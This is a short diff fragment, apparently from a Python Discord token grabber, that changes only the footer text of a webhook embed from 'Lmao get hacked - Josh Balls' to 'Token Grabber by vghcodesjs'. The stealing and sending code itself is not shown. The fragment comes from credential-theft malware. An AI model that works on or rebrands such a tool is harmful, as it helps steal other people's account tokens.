@@ -165,7 +165,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Lmao get hacked - Josh Balls",
+                    "text": f"Token Grabber by vghcodesjs",
                 }
             }
             embeds.append(embed)
